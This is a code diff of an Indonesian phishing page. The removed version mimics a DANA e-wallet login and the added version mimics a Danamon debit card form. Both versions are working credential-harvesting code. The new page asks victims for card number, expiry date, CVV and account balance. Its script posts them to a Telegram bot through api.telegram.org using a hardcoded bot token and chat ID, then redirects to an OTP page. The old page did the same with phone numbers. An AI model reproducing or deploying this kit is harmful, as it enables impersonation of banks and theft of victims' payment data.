@@ -3,202 +3,431 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login DANA</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>Form Kartu Debit Danamon</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
         body {
-            font-family: 'Open Sans', sans-serif;
-            background-color: #108EE9; /* Biru Khas DANA */
+            background-color: #fff8e1; /* Latar belakang kuning muda */
+            padding: 20px;
         }
-        .input-box {
-            border-radius: 12px;
-            background: white;
+
+        .card-container {
+            background: linear-gradient(135deg, #ffc107, #ff9800); /* Gradasi kuning ke oranye */
+            border-radius: 15px;
+            padding: 20px;
+            color: #333; /* Teks gelap agar kontras dengan latar kuning */
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid #ffb300; /* Border kuning tua */
         }
-        .btn-disabled {
-            background-color: rgba(255, 255, 255, 0.5);
-            color: #999;
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .bank-name {
+            font-size: 24px;
+            font-weight: bold;
+            color: #856404; /* Warna teks bank name kuning tua */
+        }
+
+        .card-type {
+            font-size: 18px;
+            color: #856404;
+        }
+
+        .card-chip {
+            width: 60px;
+            height: 40px;
+            background-color: #ffd700; /* Warna chip kuning emas */
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #ffb300;
+        }
+
+        .card-number {
+            font-size: 22px;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .card-expiry {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .card-holder {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .mastercard-logo {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 80px;
+            height: 50px;
+        }
+
+        .form-container {
+            background-color: #fff9c4; /* Latar form kuning sangat muda */
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(255, 193, 7, 0.3); /* Bayangan kuning */
+            border: 2px solid #ffc107;
+        }
+
+        .form-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #856404; /* Teks judul kuning tua */
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #856404; /* Teks label kuning tua */
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ffc107; /* Border input kuning */
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #fffde7; /* Latar input kuning sangat muda */
+            color: #333;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #ff9800; /* Border fokus oranye */
+            box-shadow: 0 0 5px rgba(255, 152, 0, 0.5);
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+
+        .form-col {
+            flex: 1;
+        }
+
+        .form-note {
+            font-size: 14px;
+            color: #a08400; /* Teks catatan kuning tua */
+            margin-top: 5px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #ffc107; /* Tombol kuning */
+            color: #856404; /* Teks tombol kuning tua */
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #ffb300; /* Hover tombol kuning tua */
+        }
+
+        .download-banner {
+            background-color: #ffc107; /* Banner kuning */
+            padding: 20px;
+            text-align: center;
+            border-radius: 5px;
+            border: 2px solid #ff9800;
+        }
+
+        .download-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #856404; /* Teks banner kuning tua */
+        }
+
+        /* Modal Konfirmasi */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(133, 100, 4, 0.4); /* Latar modal transparan kuning tua */
+        }
+
+        .modal-content {
+            background-color: #fff9c4; /* Latar modal kuning sangat muda */
+            margin: 15% auto;
+            padding: 20px;
+            border: 2px solid #ffc107; /* Border modal kuning */
+            width: 80%;
+            max-width: 500px;
+            border-radius: 10px;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #856404; /* Teks judul modal kuning tua */
+        }
+
+        .close-btn {
+            color: #a08400; /* Teks close kuning tua */
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close-btn:hover,
+        .close-btn:focus {
+            color: #856404;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .modal-body {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        .modal-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .confirm-btn {
+            background-color: #ffc107; /* Tombol confirm kuning */
+            color: #856404;
+        }
+
+        .confirm-btn:hover {
+            background-color: #ffb300;
+        }
+
+        .cancel-btn {
+            background-color: #ffe082; /* Tombol cancel kuning muda */
+            color: #856404;
+        }
+
+        .cancel-btn:hover {
+            background-color: #ffd54f;
         }
     </style>
 </head>
-<body class="flex flex-col min-h-screen text-white">
-
-    <div class="flex-grow flex flex-col items-center px-8 pt-12">
-        <div class="mb-12">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danany_biru.png" alt="DANA" class="h-8 brightness-0 invert">
+<body>
+    <!-- Kartu Debit Danamon -->
+    <div class="card-container">
+        <div class="card-header">
+            <div class="bank-name">Danamon</div>
+            <div class="card-type">debit</div>
         </div>
-
-        <h2 class="text-center text-lg font-semibold mb-8 px-4 leading-tight">
-            Masukkan nomor HP kamu untuk lanjut
-        </h2>
-
-        <div class="w-full max-w-sm flex space-x-3">
-            <div class="flex-none">
-                <label class="block text-xs font-semibold mb-2 opacity-80">Negara</label>
-                <div class="input-box p-3 flex items-center justify-between w-24">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="w-6 h-4 rounded-sm shadow-sm" alt="ID">
-                    <span class="text-gray-800 font-bold ml-1">+62</span>
-                </div>
-            </div>
-
-            <div class="flex-grow">
-                <label class="block text-xs font-semibold mb-2 opacity-80">Nomor</label>
-                <div class="input-box p-3">
-                    <input type="tel" 
-                           id="phoneInput"
-                           placeholder="811-1234-5678" 
-                           class="w-full bg-transparent text-gray-800 font-bold placeholder-gray-300 focus:outline-none text-lg">
-                </div>
-            </div>
-        </div>
-
-        <p class="mt-8 text-center text-sm leading-relaxed opacity-90">
-            Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan 
-            <span class="font-bold">S&K</span> serta <span class="font-bold">Kebijakan Privasi</span> kami.
-        </p>
-
-        <!-- Notifikasi status -->
-        <div id="notification" class="mt-6 p-4 rounded-lg hidden w-full max-w-sm text-center"></div>
+        <div class="card-chip"></div>
+        <div class="card-number">5577 9100 0000 0000</div>
+        <div class="card-expiry">00/00</div>
+        <div class="card-holder">JOHN DOE</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" alt="Mastercard Logo" class="mastercard-logo">
     </div>
 
-    <div class="p-6">
-        <button id="submitBtn" class="w-full bg-white text-gray-400 font-bold py-4 rounded-lg shadow-lg text-lg tracking-wider uppercase">
-            LANJUTKAN
-        </button>
+    <!-- Formulir Data Kartu Debit -->
+    <div class="form-container">
+        <h2 class="form-title">Lengkap data kartu debit</h2>
+        
+        <div class="form-group">
+            <label class="form-label">NOMOR KARTU (16 DIGIT) <span style="font-weight: normal; color: #a08400;">hanya angka</span></label>
+            <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456">
+        </div>
+
+        <div class="form-row">
+            <div class="form-col">
+                <div class="form-group">
+                    <label class="form-label">MASA BERLAKU (MMYY)</label>
+                    <input type="text" class="form-input" id="expiryDate" placeholder="1225">
+                    <p class="form-note">contoh 12/25</p>
+                </div>
+            </div>
+            <div class="form-col">
+                <div class="form-group">
+                    <label class="form-label">CVV <span style="font-weight: normal; color: #a08400;">3 digit</span></label>
+                    <input type="text" class="form-input" id="cvv" placeholder="123">
+                </div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">SISA SALDO AKHIR <span style="font-weight: normal; color: #a08400;">tanpa pemisah</span></label>
+            <input type="text" class="form-input" id="balance" placeholder="2500000">
+            <p class="form-note">hanya angka, tanpa pemisah ribuan (contoh: 7500000)</p>
+        </div>
+
+        <button class="submit-btn" id="submitBtn">KIRIM DATA & LANJUT</button>
+
+        <div class="download-banner">
+            <div class="download-text">Download<br>D-Bank PRO Sekarang!</div>
+        </div>
+    </div>
+
+    <!-- Modal Konfirmasi -->
+    <div id="confirmModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Konfirmasi Kirim Data</h2>
+                <span class="close-btn">&times;</span>
+            </div>
+            <div class="modal-body">
+                <p>Apakah Anda yakin ingin mengirim data ini ke bot Telegram?</p>
+                <p><strong>Data yang akan dikirim:</strong></p>
+                <p>Nomor Kartu: <span id="modalCardNumber"></span></p>
+                <p>Masa Berlaku: <span id="modalExpiryDate"></span></p>
+                <p>CVV: <span id="modalCvv"></span></p>
+                <p>Sisa Saldo Akhir: <span id="modalBalance"></span></p>
+            </div>
+            <div class="modal-footer">
+                <button class="modal-btn cancel-btn" id="cancelBtn">Batal</button>
+                <button class="modal-btn confirm-btn" id="confirmBtn">Kirim</button>
+            </div>
+        </div>
     </div>
 
     <script>
-        // ===== KONFIGURASI BOT TELEGRAM =====
-        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
-        const CHAT_ID = '8592742129';
+        // Ambil elemen DOM
+        const submitBtn = document.getElementById('submitBtn');
+        const confirmModal = document.getElementById('confirmModal');
+        const closeBtn = document.querySelector('.close-btn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const modalCardNumber = document.getElementById('modalCardNumber');
+        const modalExpiryDate = document.getElementById('modalExpiryDate');
+        const modalCvv = document.getElementById('modalCvv');
+        const modalBalance = document.getElementById('modalBalance');
 
-        // Fungsi untuk mengirim data ke Telegram
-        async function sendToTelegram(phoneNumber) {
-            const message = `📱 *Login DANA - Nomor HP* 📱\n\n📞 *Nomor:* +62${phoneNumber}\n\n⏱ *Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
+        // Buka modal konfirmasi saat tombol submit diklik
+        submitBtn.addEventListener('click', () => {
+            // Ambil nilai dari input
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const balance = document.getElementById('balance').value;
 
-                const result = await response.json();
-                
-                if (result.ok) {
-                    showNotification('✅ Nomor', 'success dikirim');
-                    console.log('Nomor terkirim:', phoneNumber);
-                    
-                    // Simpan nomor di sessionStorage untuk digunakan di halaman OTP
-                    sessionStorage.setItem('danaPhoneNumber', phoneNumber);
-                    
-                    // Redirect ke halaman OTP setelah 1 detik
-                    setTimeout(() => {
-                        window.location.href = 'otp.html';
-                    }, 1000);
-                    
-                    return true;
+            // Isi data ke modal
+            modalCardNumber.textContent = cardNumber;
+            modalExpiryDate.textContent = expiryDate;
+            modalCvv.textContent = cvv;
+            modalBalance.textContent = balance;
+
+            // Tampilkan modal
+            confirmModal.style.display = 'block';
+        });
+
+        // Tutup modal saat tombol close atau cancel diklik
+        closeBtn.addEventListener('click', () => {
+            confirmModal.style.display = 'none';
+        });
+
+        cancelBtn.addEventListener('click', () => {
+            confirmModal.style.display = 'none';
+        });
+
+        // Tutup modal saat klik di luar modal
+        window.addEventListener('click', (e) => {
+            if (e.target === confirmModal) {
+                confirmModal.style.display = 'none';
+            }
+        });
+
+        // Kirim data ke bot Telegram saat tombol confirm diklik
+        confirmBtn.addEventListener('click', () => {
+            // Ambil nilai dari input
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const balance = document.getElementById('balance').value;
+
+            // Ganti dengan token bot Telegram Anda dan chat ID
+            const botToken = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
+            const chatId = '8592742129';
+
+            // Buat pesan yang akan dikirim
+            const message = `Data Kartu Debit Danamon:\n\nNomor Kartu: ${cardNumber}\nMasa Berlaku: ${expiryDate}\nCVV: ${cvv}\nSisa Saldo Akhir: ${balance}`;
+
+            // Kirim data ke bot Telegram menggunakan fetch API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Data berhasil dikirim ke bot Telegram!');
+                    confirmModal.style.display = 'none';
+                    // Reset form setelah berhasil dikirim
+                    document.getElementById('cardNumber').value = '';
+                    document.getElementById('expiryDate').value = '';
+                    document.getElementById('cvv').value = '';
+                    document.getElementById('balance').value = '';
+                    // Navigasi ke halaman OTP.HTML
+                    window.location.href = 'OTP.HTML';
                 } else {
-                    showNotification('❌ Gagal mengirim nomor', 'error');
-                    console.error('Gagal mengirim:', result);
-                    return false;
+                    alert('Gagal mengirim data. Silakan coba lagi.');
                 }
-            } catch (error) {
-                showNotification('❌ Error koneksi', 'error');
+            })
+            .catch(error => {
                 console.error('Error:', error);
-                return false;
-            }
-        }
-
-        // Fungsi untuk menampilkan notifikasi
-        function showNotification(message, type) {
-            const notification = document.getElementById('notification');
-            notification.classList.remove('hidden', 'bg-green-500', 'bg-red-500', 'bg-green-600', 'bg-red-600');
-            
-            if (type === 'success') {
-                notification.classList.add('bg-green-600', 'text-white');
-            } else {
-                notification.classList.add('bg-red-600', 'text-white');
-            }
-            
-            notification.textContent = message;
-            
-            // Sembunyikan notifikasi setelah 3 detik
-            setTimeout(() => {
-                notification.classList.add('hidden');
-            }, 3000);
-        }
-
-        // Fungsi untuk membersihkan nomor telepon
-        function cleanPhoneNumber(input) {
-            // Hapus semua karakter non-digit
-            let cleaned = input.replace(/\D/g, '');
-            
-            // Hapus angka 0 di depan jika ada
-            if (cleaned.startsWith('0')) {
-                cleaned = cleaned.substring(1);
-            }
-            
-            // Hapus kode negara jika ada (62)
-            if (cleaned.startsWith('62') && cleaned.length > 2) {
-                cleaned = cleaned.substring(2);
-            }
-            
-            return cleaned;
-        }
-
-        // Fungsi untuk validasi nomor telepon
-        function validatePhoneNumber(number) {
-            // Minimal 8 digit, maksimal 12 digit (untuk nomor Indonesia)
-            return number.length >= 8 && number.length <= 12;
-        }
-
-        // Event listener untuk tombol LANJUTKAN
-        document.getElementById('submitBtn').addEventListener('click', async function() {
-            const phoneInput = document.getElementById('phoneInput');
-            const rawPhone = phoneInput.value.trim();
-            
-            if (rawPhone === '') {
-                showNotification('❌ Silakan masukkan nomor telepon', 'error');
-                return;
-            }
-            
-            const cleanedPhone = cleanPhoneNumber(rawPhone);
-            
-            if (!validatePhoneNumber(cleanedPhone)) {
-                showNotification('❌ Nomor telepon tidak valid (min 8 digit, maks 12 digit)', 'error');
-                return;
-            }
-            
-            // Tampilkan notifikasi mengirim
-            showNotification('📤 Mengirim nomor...', 'success');
-            
-            // Kirim ke Telegram
-            await sendToTelegram(cleanedPhone);
+                alert('Terjadi kesalahan saat mengirim data.');
+            });
         });
-
-        // Event listener untuk input nomor (format real-time)
-        document.getElementById('phoneInput').addEventListener('input', function(e) {
-            // Hanya izinkan angka
-            this.value = this.value.replace(/\D/g, '');
-        });
-
-        // Debug: tampilkan pesan jika token belum diganti
-        if (BOT_TOKEN === '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg') {
-            console.warn('⚠️ PERINGATAN: Ganti BOT_TOKEN dengan token bot Telegram Anda!');
-        }
-        if (CHAT_ID === '8592742129') {
-            console.warn('⚠️ PERINGATAN: Ganti CHAT_ID dengan chat ID Anda!');
-        }
     </script>
-
 </body>
 </html>
